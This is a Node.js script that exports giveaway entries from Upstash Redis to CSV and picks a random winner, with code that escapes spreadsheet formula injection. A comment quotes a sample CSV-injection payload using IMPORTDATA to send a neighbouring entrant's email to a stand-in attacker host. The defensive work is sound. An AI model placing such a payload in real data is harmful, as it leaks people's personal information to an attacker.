#!/usr/bin/env node
/**
 * Exports giveaway entries to CSV so a winner can be drawn.
 *
 * Reads the same Upstash keys the entry route writes, using the entry
 * deadline in content/config/giveaway.json to pick the campaign.
 *
 * Usage:
 *   UPSTASH_REDIS_REST_URL=... UPSTASH_REDIS_REST_TOKEN=... \
 *     node scripts/export-giveaway-entries.mjs > entries.csv
 *
 * Pick a winner at random (after reviewing eligibility):
 *   node scripts/export-giveaway-entries.mjs --pick
 */

import { readFileSync } from 'fs'
import { Redis } from '@upstash/redis'

const config = JSON.parse(readFileSync('content/config/giveaway.json', 'utf8'))

if (!process.env.UPSTASH_REDIS_REST_URL || !process.env.UPSTASH_REDIS_REST_TOKEN) {
  console.error('Set UPSTASH_REDIS_REST_URL and UPSTASH_REDIS_REST_TOKEN first.')
  console.error('Find them in Vercel -> Project Settings -> Environment Variables.')
  process.exit(1)
}

if (!config.entryDeadline) {
  console.error('content/config/giveaway.json has no entryDeadline, so there is no campaign to export.')
  process.exit(1)
}

const campaign = config.entryDeadline.replace(/[^0-9a-z]/gi, '').slice(0, 20) || 'default'
const redis = Redis.fromEnv()

const raw = await redis.lrange(`wg:giveaway:${campaign}:entries`, 0, -1)
const entries = raw
  .map((item) => (typeof item === 'string' ? JSON.parse(item) : item))
  .filter(Boolean)

if (entries.length === 0) {
  console.error(`No entries found for campaign "${campaign}".`)
  process.exit(1)
}

if (process.argv.includes('--pick')) {
  // crypto.getRandomValues avoids Math.random's modulo bias, which matters
  // when the outcome is a prize someone could reasonably question.
  const buf = new Uint32Array(1)
  crypto.getRandomValues(buf)
  const winner = entries[buf[0] % entries.length]
  console.error(`\n${entries.length} entries. Randomly selected:\n`)
  console.error(`  ${winner.firstName} ${winner.lastName}`)
  console.error(`  ${winner.email}`)
  console.error(`  entered ${winner.enteredAt}`)
  console.error(`\nVerify eligibility before notifying anyone.\n`)
  process.exit(0)
}

// Quoting alone does NOT stop spreadsheet formula evaluation: CSV quotes are a
// field delimiter, stripped on import before the cell is interpreted, so "=1+1"
// arrives as a formula.
//
// Every field here is attacker-influenced — the name fields obviously, and the
// email regex happily accepts something like
//   =IMPORTDATA("https://evil.tld/?x"&C2)@a.co
// which has no whitespace and exactly one @.
//
// Google Sheets is the sharp edge: the IMPORT family evaluates on import with
// no click and no prompt, so a payload in one cell can read an adjacent
// entrant's email address and send it to an attacker. Excel evaluates too but
// gates external fetches behind a prompt; LibreOffice leaves "Evaluate
// formulas" unchecked by default.
//
// Prefixing a single quote marks the cell as literal text.
//
// The trigger test runs against a probe with leading characters stripped that a
// spreadsheet may discard on import but JS trim() keeps -- NUL and other C0
// controls, soft hyphen, zero-width and bidi marks. Without that, a value like
// "\u0000=1+1" would reach the file unprefixed and could still be read as a
// formula. The prefix is applied to the original value, not the probe, so
// nothing is silently dropped from the export.
const HIDDEN_LEAD = /^[\s\u0000-\u001f\u00ad\u200b-\u200f\u2060\ufeff]+/
const esc = (v) => {
  const raw = String(v ?? '')
  const probe = raw.replace(HIDDEN_LEAD, '')
  const safe = /^[=+\-@]/.test(probe) ? `'${raw}` : raw
  return `"${safe.replace(/"/g, '""')}"`
}
console.log('first_name,last_name,email,marketing_consent,entered_at')
for (const e of entries) {
  console.log(
    [e.firstName, e.lastName, e.email, e.marketingConsent, e.enteredAt].map(esc).join(',')
  )
}
console.error(`\n${entries.length} entries exported for campaign "${campaign}".`)
